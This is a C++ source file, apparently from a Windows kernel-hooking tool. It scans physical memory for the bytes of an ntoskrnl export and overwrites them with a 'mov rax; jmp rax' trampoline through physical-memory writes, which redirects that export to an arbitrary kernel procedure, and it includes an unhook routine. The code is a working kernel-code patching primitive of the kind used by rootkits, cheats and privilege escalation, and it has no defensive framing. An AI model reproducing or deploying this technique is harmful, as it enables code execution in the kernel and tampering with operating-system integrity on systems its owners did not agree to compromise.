#include "driver.hpp"

namespace driver_util {
    constexpr auto hook_sz = 12;

    std::optional<std::vector<phys_mem_range>> get_physmem_ranges() {
        util::log("Retrieving physical memory ranges...");

        HKEY key{};
        if (const auto res = RegOpenKeyExA(HKEY_LOCAL_MACHINE, R"(HARDWARE\RESOURCEMAP\System Resources\Physical Memory)", 0, KEY_READ, &key); res != ERROR_SUCCESS)
            return util::log("Failed to open registry key for physical memory ranges. Error code:  %d", res), std::nullopt;

        auto data_type{ 0ul };
        auto data_size{ 0ul };

        if (const auto res = RegQueryValueExA(key, ".Translated", nullptr, &data_type, nullptr, &data_size); res != ERROR_SUCCESS)
            return util::log("Failed to query registry key for physical memory ranges. Error code:  %d", res), std::nullopt;


        const auto data = std::make_unique_for_overwrite<unsigned char[]>(data_size);
        if (const auto res = RegQueryValueExA(key, ".Translated", nullptr, &data_type, data.get(), &data_size); res != ERROR_SUCCESS)
            return util::log("Failed to query registry key for physical memory ranges. Error code:  %d", res), std::nullopt;

        const auto descriptor_count = *reinterpret_cast<DWORD*>(data.get() + 16);
        auto mem_record = data.get() + 24;

        std::vector<phys_mem_range> phys_mem_ranges{};
        for (auto i = 0u; i < descriptor_count; ++i) {
            phys_mem_ranges.push_back(phys_mem_range{ *reinterpret_cast<std::size_t*>(mem_record), *reinterpret_cast<std::uint64_t*>(mem_record + 8) });
            mem_record += 0x14;
        }
        RegCloseKey(key);
        return phys_mem_ranges;
    }

    [[nodiscard]] bool driver::find_medium_pa() {
        util::log("Retrieving NT procedure physical address...");

        std::vector<phys_mem_range> phys_mem_ranges{};

        try {
            phys_mem_ranges = get_physmem_ranges().value();
        }
        catch (const std::bad_optional_access& err) {
            return util::log("Failed to retrieve physical memory ranges. Error message: %s", err.what()), 0;
        }

        const auto nt_medium_va = GetProcAddress(this->ntoskrnl_cpy, this->medium_name);
        if (!nt_medium_va)
            return util::log("Failed to retrieve %s virtual address. Error code: %d", this->medium_name, GetLastError()), 0;

        const auto export_page_offset = reinterpret_cast<std::size_t>(nt_medium_va) % 0x1000;

        for (auto& [range_start, range_length] : phys_mem_ranges) {
            for (std::size_t page_cursor = range_start + export_page_offset; page_cursor < (range_start + range_length); page_cursor += 0x1000) {
                const auto read_bytes = std::unique_ptr<std::uint8_t>(read_phys_mem<24>(page_cursor));

                if (!read_bytes)
                    continue;
                if (!std::memcmp(read_bytes.get(), this->medium_original_instructions, 24)) {
                    util::log("%s physical address: %p", this->medium_name, page_cursor);
                    this->medium_pa = page_cursor;
                    return true;
                }
            }
        }
        util::log("Failed to find physical address of %s", this->medium_name);
        return false;
    }

    typedef struct SYSTEM_MODULE {
        ULONG                Reserved1;
        ULONG                Reserved2;
#ifdef _WIN64
        ULONG				Reserved3;
#endif
        PVOID                ImageBaseAddress;
        ULONG                ImageSize;
        ULONG                Flags;
        WORD                 Id;
        WORD                 Rank;
        WORD                 w018;
        WORD                 NameOffset;
        CHAR                 Name[260];
    }SYSTEM_MODULE, * PSYSTEM_MODULE;

    typedef struct SYSTEM_MODULE_INFORMATION {
        ULONG                ModulesCount;
        SYSTEM_MODULE        Modules[1];
    } SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;


    std::size_t get_mod_base_addr(const char* mod)
    {
        ULONG retn;
        NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(0xB), nullptr, 0, &retn);
        const auto minf = static_cast<PSYSTEM_MODULE_INFORMATION>(GlobalAlloc(GMEM_ZEROINIT, retn));
        const auto mod_ln = strlen(mod);
        NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(0xB), minf, sizeof SYSTEM_MODULE_INFORMATION, &retn);
        for (unsigned int i = 0; i < minf->ModulesCount; i++) {
            const auto kernel_img = minf->Modules[i].Name;
            if (const auto img_ln = strlen(kernel_img); mod_ln > img_ln || memcmp(mod, kernel_img + img_ln - mod_ln, mod_ln))
                continue;
            return reinterpret_cast<std::size_t>(minf->Modules[i].ImageBaseAddress);
        }
        return 0;
    }


    [[nodiscard]] bool driver::hook_medium(const char* target_nt_proc) {
        util::log("Hooking NT procedure...");
        std::uint8_t bytes[]{ 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };

        const auto nt_proc_va = reinterpret_cast<std::uint64_t>(GetProcAddress(this->ntoskrnl_cpy, target_nt_proc));
       
        if (!nt_proc_va)
            return util::log("Failed to get %s address. Error code: %d", target_nt_proc, GetLastError()), false;

        //this->kernel_handle is NOT the real kernel base. thats why we get the rva then add it to the real kernel base
        *reinterpret_cast<std::uint64_t*>(bytes + 2) = this->ntoskrnl_base_address + nt_proc_va - reinterpret_cast<std::uint64_t>(this->ntoskrnl_cpy);

        const auto res = write_phys_mem<hook_sz>(this->medium_pa, bytes);
        if (!res)
            return false;

        this->is_hooked = true;
        util::log("Hooked at %X", this->medium_pa);
        return true;
    }

    bool driver::unhook_medium() {
        util::log("Unhooking native procedure...");

        if (!this->is_hooked)
            return util::log("Call hook_ntproc before calling unhook_ntproc!"), false;

        const auto res = write_phys_mem<hook_sz>(this->medium_pa, this->medium_original_instructions);

        if (!res)
            return util::log("Failed to unhook NT procedure"), false;
        util::log("Unhooked native procedure");
        this->is_hooked = false;
        return true;

    }
}

